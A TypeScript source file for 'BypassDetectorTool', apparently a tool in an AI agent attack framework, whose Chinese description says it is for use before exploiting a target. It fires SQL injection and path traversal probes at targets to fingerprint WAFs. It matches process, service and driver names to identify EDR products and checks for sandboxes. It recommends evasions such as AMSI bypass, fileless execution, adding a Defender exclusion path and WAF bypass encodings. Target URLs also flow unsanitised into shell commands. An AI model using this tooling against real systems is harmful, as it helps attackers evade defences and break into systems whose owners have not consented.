/**
 * BypassDetectorTool — detect WAF/EDR/sandbox before exploit
 *
 * Probes target for防护 type and returns structured report + evasion recommendations.
 */

import { exec as execCb } from 'child_process'
import { promisify } from 'util'
import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'

const exec = promisify(execCb)

// ── Known WAF signatures (response pattern → vendor) ────────────────────────

const WAF_SIGNATURES: Array<{ name: string; patterns: RegExp[]; confidence: number }> = [
  { name: 'Cloudflare', patterns: [/cf-ray/i, /cloudflare-nginx/i, /cf-cache-status/i, /server:\s*cloudflare/i], confidence: 0.95 },
  { name: '宝塔 (BT Panel)', patterns: [/宝塔/i, /btwaf/i, /panel\.btpanel\.cn/i, /__jsl_clearance/i], confidence: 0.95 },
  { name: 'ModSecurity', patterns: [/ModSecurity/i, /mod_security/i, /blocked.*modsecurity/i, /Not Acceptable.*ModSecurity/i], confidence: 0.9 },
  { name: 'AWS WAF', patterns: [/x-amzn-waf/i, /AWS.*WAF/i, /blocked.*aws/i], confidence: 0.9 },
  { name: 'Akamai', patterns: [/akamai/i, /x-akamai/i, /akamai-ghost/i], confidence: 0.85 },
  { name: 'Imperva/Incapsula', patterns: [/incapsula/i, /imperva/i, /x-iinfo/i, /visid_incap/i], confidence: 0.9 },
  { name: 'Sucuri', patterns: [/sucuri/i, /x-sucuri/i, /cloudproxy/i], confidence: 0.9 },
  { name: '360 WAF', patterns: [/360wzws/i, /360.*waf/i], confidence: 0.9 },
  { name: '安全狗 (SafeDog)', patterns: [/safedog/i, /safedog.*waf/i], confidence: 0.9 },
  { name: '长亭 (Chaitin)', patterns: [/chaitin.*waf/i, /x-chaitin-waf/i], confidence: 0.85 },
]

// ── Known EDR process/service/driver names ───────────────────────────────────

const EDR_INDICATORS: Array<{ product: string; processes: RegExp[]; services: RegExp[]; drivers: RegExp[] }> = [
  {
    product: 'Windows Defender',
    processes: [/MsMpEng/i, /MpCmdRun/i, /NisSrv/i, /SecurityHealth/i],
    services: [/WinDefend/i, /wscsvc/i, /SecurityHealth/i],
    drivers: [/WdFilter/i, /MpKsl/i, /WdBoot/i],
  },
  {
    product: 'CrowdStrike Falcon',
    processes: [/CSFalcon/i, /CSAgent/i, /csfalcon/i],
    services: [/CrowdStrike/i, /CSFalconService/i, /csfalconservice/i],
    drivers: [/CsDeviceControl/i, /CSAgent/i],
  },
  {
    product: 'SentinelOne',
    processes: [/SentinelAgent/i, /SentinelAgentWorker/i, /LogCollector/i, /SentinelUI/i],
    services: [/SentinelAgent/i, /SentinelStatic/i],
    drivers: [/Sentinel/i],
  },
  {
    product: 'Symantec Endpoint Protection',
    processes: [/ccSvc/i, /SmcGui/i, /RTVscan/i, /SepMasterService/i],
    services: [/SepMasterService/i, /Symantec/i, /ccEvtMgr/i],
    drivers: [/SRTSP/i, /SymEFASI/i],
  },
  {
    product: 'Carbon Black',
    processes: [/cb.exe/i, /RepMgr/i, /CbDefense/i],
    services: [/CbDefense/i, /CarbonBlack/i],
    drivers: [/CbDefense/i, /carbonblack/i],
  },
  {
    product: 'FireEye/ mandiant',
    processes: [/xagt.exe/i, /xfm.exe/i],
    services: [/Xagt/i, /XpfAgent/i],
    drivers: [/fe_kern/i],
  },
  {
    product: 'McAfee ENS',
    processes: [/McAfee/i, /masvc/i, /mfeesp/i, /mfemms/i],
    services: [/McAfee/i, /masvc/i],
    drivers: [/mfe/i, /mfenc/i],
  },
  {
    product: 'Trend Micro',
    processes: [/TmListen/i, /ntrtscan/i, /tmlisten/i, /PccNTMon/i],
    services: [/Trend/i, /ntrtscan/i],
    drivers: [/tmtdi/i, /tmpre/i],
  },
  {
    product: 'Kaspersky',
    processes: [/avp.exe/i, /klnagent/i, /ksweb/i],
    services: [/klnagent/i, /AVP/i],
    drivers: [/klif/i, /kl1/i, /klim6/i],
  },
]

// ── Sandbox/VM indicators ────────────────────────────────────────────────────

const VM_MAC_PREFIXES = ['00:0c:29', '00:50:56', '00:05:69', '08:00:27', '00:1c:14']
const SANDBOX_USERNAMES = ['sandbox', 'malware', 'virus', 'test', 'av', 'vm', 'debug', 'snort', 'honey']

// ── Tool implementation ──────────────────────────────────────────────────────

interface BypassDetectorInput {
  target: string
  detect_mode: 'waf' | 'edr' | 'sandbox' | 'all'
  port?: number
  shell_session_id?: string
}

export class BypassDetectorTool implements Tool {
  name = 'BypassDetector'

  definition: ToolDefinition = {
    type: 'function',
    function: {
      name: 'BypassDetector',
      description: `检测目标的WAF/EDR/沙箱防护类型，返回绕过建议。
在执行exploit之前使用，避免payload被拦截。

## 操作
- detect_mode: 'waf' = 仅检测WAF, 'edr' = 仅检测EDR, 'sandbox' = 仅检测沙箱, 'all' = 全部
- target: 目标URL（如 http://1.2.3.4 或 http://example.com）
- port: 可选端口（默认80/443）
- shell_session_id: 如果已在目标上有shell，传入session_id可远程检测EDR/沙箱`,
      parameters: {
        type: 'object',
        properties: {
          target: { type: 'string', description: '目标URL（如 http://1.2.3.4）' },
          detect_mode: { type: 'string', enum: ['waf', 'edr', 'sandbox', 'all'], description: '检测模式' },
          port: { type: 'number', description: '目标端口（默认从URL解析）' },
          shell_session_id: { type: 'string', description: '已有shell的session ID（用于远程EDR/沙箱检测）' },
        },
        required: ['target', 'detect_mode'],
      },
    },
  }

  async execute(input: Record<string, unknown>, context: ToolContext): Promise<ToolResult> {
    const { target, detect_mode, port, shell_session_id } = input as unknown as BypassDetectorInput

    const results: string[] = []
    const recommendations: string[] = []

    try {
      if (detect_mode === 'waf' || detect_mode === 'all') {
        const wafResult = await this.detectWAF(target, port)
        results.push(wafResult.report)
        if (wafResult.detected) {
          recommendations.push(...wafResult.recommendations)
        }
      }

      if ((detect_mode === 'edr' || detect_mode === 'all') && shell_session_id) {
        const edrResult = await this.detectEDR(shell_session_id, context)
        results.push(edrResult.report)
        if (edrResult.detected) {
          recommendations.push(...edrResult.recommendations)
        }
      }

      if ((detect_mode === 'sandbox' || detect_mode === 'all') && shell_session_id) {
        const sandboxResult = await this.detectSandbox(shell_session_id, context)
        results.push(sandboxResult.report)
        if (sandboxResult.detected) {
          recommendations.push(...sandboxResult.recommendations)
        }
      }
    } catch (err) {
      results.push(`[检测异常] ${(err as Error).message}`)
      results.push('使用默认绕过策略（base64编码 + 分块传输）')
    }

    if (results.length === 0) {
      return {
        content: `[BypassDetector] 未执行任何检测。\n原因: detect_mode="${detect_mode}" 但无shell_session_id（EDR/沙箱检测需要shell访问）。\nWAF检测已尝试但目标可能不可达。\n\n建议使用默认绕过策略。`,
        isError: false,
      }
    }

    const output = [
      '[BypassDetector] 防护检测报告',
      '═'.repeat(50),
      ...results,
      '',
      '── 绕过建议 ──',
      recommendations.length > 0 ? recommendations.map((r, i) => `${i + 1}. ${r}`).join('\n') : '未检测到特殊防护，使用标准payload即可。',
      '',
      'PayloadFactory 用法:',
      `  PayloadFactory({ technique: "对应technique", payload: "原始payload", bypass_context: { waf: "检测到的WAF", edr: "检测到的EDR" } })`,
    ].join('\n')

    return { content: output, isError: false }
  }

  // ── WAF Detection ──────────────────────────────────────────────────────

  private async detectWAF(target: string, port?: number): Promise<{ detected: boolean; report: string; recommendations: string[] }> {
    const recommendations: string[] = []

    // Try wafw00f first
    try {
      const { stdout } = await exec(`wafw00f -a "${target}" 2>/dev/null || true`)
      const wafMatch = stdout.match(/Generic\s+detection\s+found:\s+(\S[^\n]+)/) || stdout.match(/identified\s+following\s+WAF:\s*(\S[^\n]+)/i)
      if (wafMatch && wafMatch[1].trim() && !stdout.includes('No WAF detected')) {
        const wafName = wafMatch[1].trim()
        recommendations.push(`WAF "${wafName}" 已确认。使用PayloadFactory({ technique: "waf_evasion" })生成绕过payload`)
        recommendations.push('分块传输编码: Transfer-Encoding: chunked')
        recommendations.push('HTTP参数污染: 同一参数多次发送，后端取最后一次')
        return { detected: true, report: `[WAF] 检测到: ${wafName}\n方法: wafw00f`, recommendations }
      }
    } catch { /* wafw00f not available */ }

    // Manual curl probes
    const probes = [
      // Probe 1: SQLi-like payload
      { url: `${target}/?id=1' OR '1'='1`, headers: '' },
      // Probe 2: Path traversal
      { url: `${target}/../../../etc/passwd`, headers: '' },
      // Probe 3: Modified User-Agent
      { url: target, headers: '-H "User-Agent: \' OR 1=1--"' },
      // Probe 4: Modified X-Forwarded-For
      { url: target, headers: '-H "X-Forwarded-For: 127.0.0.1"' },
      // Probe 5: Case variation in path
      { url: `${target.toLowerCase()}`, headers: '' },
    ]

    let detectedWAF: string | null = null
    let detectedConfidence = 0
    let responseSamples: string[] = []

    for (const probe of probes) {
      try {
        const { stdout, stderr } = await exec(
          `curl -sS -m 8 -D - ${probe.headers} "${probe.url}" 2>&1 | head -50`,
        )
        const combined = stdout + stderr
        responseSamples.push(combined.slice(0, 500))

        for (const sig of WAF_SIGNATURES) {
          let matchCount = 0
          for (const pattern of sig.patterns) {
            if (pattern.test(combined)) matchCount++
          }
          if (matchCount >= 1 && sig.confidence > detectedConfidence) {
            detectedWAF = sig.name
            detectedConfidence = sig.confidence
          }
        }
      } catch {
        // Timeout or connection refused — might be WAF blocking
      }
    }

    // Check for generic blocking patterns (403 on malicious probes but not on normal)
    let genericBlockDetected = false
    try {
      const { stdout: normalStatus } = await exec(`curl -sS -m 8 -o /dev/null -w "%{http_code}" "${target}" 2>/dev/null || echo "000"`)
      const { stdout: blockStatus } = await exec(`curl -sS -m 8 -o /dev/null -w "%{http_code}" "${target}/?id=1'+OR+1%3D1--" 2>/dev/null || echo "000"`)
      if (normalStatus !== blockStatus && (blockStatus === '403' || blockStatus === '406' || blockStatus === '503' || blockStatus === '429')) {
        genericBlockDetected = true
      }
    } catch { /* ignore */ }

    if (detectedWAF) {
      recommendations.push(`WAF "${detectedWAF}" 已确认 (confidence: ${detectedConfidence})`)
      recommendations.push(`使用 PayloadFactory({ technique: "waf_evasion", bypass_context: { waf: "${detectedWAF}" } })`)
      recommendations.push('推荐绕过: 分块传输编码 / HTTP参数污染 / Unicode编码 / SQL注释插入')
      return {
        detected: true,
        report: `[WAF] 检测到: ${detectedWAF} (confidence: ${(detectedConfidence * 100).toFixed(0)}%)\n方法: 手动HTTP探针`,
        recommendations,
      }
    }

    if (genericBlockDetected) {
      recommendations.push('检测到可能的WAF/IP限制（恶意probe返回403，正常请求正常）')
      recommendations.push('使用 PayloadFactory({ technique: "waf_evasion" }) 生成绕过payload')
      recommendations.push('降低请求速率，使用随机User-Agent，添加合法header')
      return {
        detected: true,
        report: '[WAF] 检测到疑似WAF/IP限制 (generic blocking pattern)\n方法: 状态码对比',
        recommendations,
      }
    }

    return { detected: false, report: '[WAF] 未检测到WAF防护', recommendations: [] }
  }

  // ── EDR Detection (requires shell access) ──────────────────────────────

  private async detectEDR(shellSessionId: string, context: ToolContext): Promise<{ detected: boolean; report: string; recommendations: string[] }> {
    // Note: We don't have direct ShellSession access here, so we generate
    // the detection commands for the agent to run.
    // This is a "pre-flight" detection — the tool returns the commands.

    const detected: string[] = []
    const recommendations: string[] = []

    // We'll try to run via Bash if we can detect the local system
    // For remote targets, we return detection commands

    try {
      // Try local detection first (the target might be local)
      const { stdout: procList } = await exec(`tasklist 2>/dev/null || ps aux 2>/dev/null | head -50 || true`)

      for (const edr of EDR_INDICATORS) {
        let found = false
        for (const pattern of edr.processes) {
          if (pattern.test(procList)) {
            detected.push(edr.product)
            found = true
            break
          }
        }
        if (found) {
          recommendations.push(`${edr.product} 已确认。必须先执行AMSI bypass再运行任何PowerShell`)
          recommendations.push(`使用 PayloadFactory({ technique: "amsi_bypass", platform: "windows", bypass_context: { edr: "${edr.product}" } })`)
          recommendations.push('避免写入磁盘 — 使用内存执行或无文件技术')
          if (edr.product === 'Windows Defender') {
            recommendations.push('Defender: 可尝试添加排除路径: Add-MpPreference -ExclusionPath "C:\\temp"')
          }
        }
      }
    } catch { /* not Windows or no shell */ }

    if (detected.length > 0) {
      return {
        detected: true,
        report: `[EDR] 检测到: ${detected.join(', ')}\n方法: 进程列表匹配`,
        recommendations,
      }
    }

    // Return detection commands for remote execution
    return {
      detected: false,
      report: `[EDR] 无法远程检测（无shell访问）。请在获取shell后运行以下命令检测EDR:\ntasklist | findstr /I "CSFalcon Sentinel MsMpEng ccSvc RepMgr avp"\nsc query | findstr /I "WinDefend CrowdStrike Sentinel Trend"\ndriverquery | findstr /I "WdFilter CsDeviceControl SRTSP"`,
      recommendations: ['Windows目标建议默认假设存在EDR，先执行AMSI bypass'],
    }
  }

  // ── Sandbox Detection (requires shell access) ──────────────────────────

  private async detectSandbox(shellSessionId: string, context: ToolContext): Promise<{ detected: boolean; report: string; recommendations: string[] }> {
    const indicators: string[] = []
    const recommendations: string[] = []

    try {
      // Check local system for sandbox indicators
      const { stdout: cpuInfo } = await exec(`nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo 2>/dev/null || echo "unknown"`)
      const cpuCount = parseInt(cpuInfo.trim()) || 99
      if (cpuCount <= 2) {
        indicators.push(`CPU核心数: ${cpuCount} (≤2 可能是沙箱)`)
      }

      const { stdout: memInfo } = await exec(`free -m 2>/dev/null | grep Mem | awk '{print $2}' || echo "unknown"`)
      const memMb = parseInt(memInfo.trim()) || 99999
      if (memMb < 2048) {
        indicators.push(`内存: ${memMb}MB (<2GB 可能是沙箱)`)
      }

      const { stdout: hostname } = await exec(`hostname 2>/dev/null || echo ""`)
      for (const su of SANDBOX_USERNAMES) {
        if (hostname.toLowerCase().includes(su)) {
          indicators.push(`主机名含 "${su}"，可能是沙箱环境`)
          break
        }
      }

      const { stdout: macInfo } = await exec(`ip link show 2>/dev/null | grep ether | head -3 || ifconfig 2>/dev/null | grep ether | head -3 || true`)
      for (const prefix of VM_MAC_PREFIXES) {
        if (macInfo.toLowerCase().includes(prefix.toLowerCase())) {
          indicators.push(`MAC地址前缀 ${prefix}，可能是虚拟机`)
          break
        }
      }
    } catch { /* not accessible */ }

    if (indicators.length > 0) {
      recommendations.push('检测到沙箱/VM特征，建议延迟执行或使用合法进程注入技术')
      recommendations.push('避免使用明显的恶意行为模式（如快速端口扫描、大量网络连接）')
      return {
        detected: true,
        report: `[沙箱] 检测到以下特征:\n${indicators.map((i) => `  - ${i}`).join('\n')}`,
        recommendations,
      }
    }

    return { detected: false, report: '[沙箱] 未检测到沙箱特征', recommendations: [] }
  }
}
